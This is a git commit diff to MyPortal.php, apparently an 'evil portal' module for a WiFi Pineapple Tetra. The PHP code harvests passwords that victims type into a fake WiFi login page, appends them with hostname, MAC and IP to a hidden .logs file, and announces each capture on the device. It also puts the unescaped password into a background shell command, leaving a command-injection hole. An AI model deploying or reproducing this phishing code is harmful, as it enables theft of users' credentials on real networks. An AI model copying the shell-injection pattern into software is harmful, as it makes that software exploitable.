216da5d3994790612266718c88276821bf288e9b
Dominik Hulin <109801079+Fattcat@users.noreply.github.com>
2024-07-28 21:18:20 +0200

    Update MyPortal.php

--- MyPortal.php
+++ MyPortal.php
@@ -4,19 +4,18 @@ class MyPortal extends Portal
 {
     public function handleAuthorization()
     {
-        if (isset($_POST['email'])) {
-            $email = $_POST['email'];
+        if (isset($_POST['password'])) {
             $pwd = $_POST['password'];
-            $hostname = $_POST['hostname'];
-            $mac = $_POST['mac'];
-            $ip = $_POST['ip'];
+            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
+            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
+            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
 
             $reflector = new \ReflectionClass(get_class($this));
             $logPath = dirname($reflector->getFileName());
-            file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+            file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "password: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
 
             // Notify WiFi Pineapple Tetra's notification bar
-            $this->execBackground("notify 'Captured credentials - Email: $email, Password: $pwd'");
+            $this->execBackground("notify 'Captured password: $pwd'");
         }
 
         // Call parent to handle basic authorization
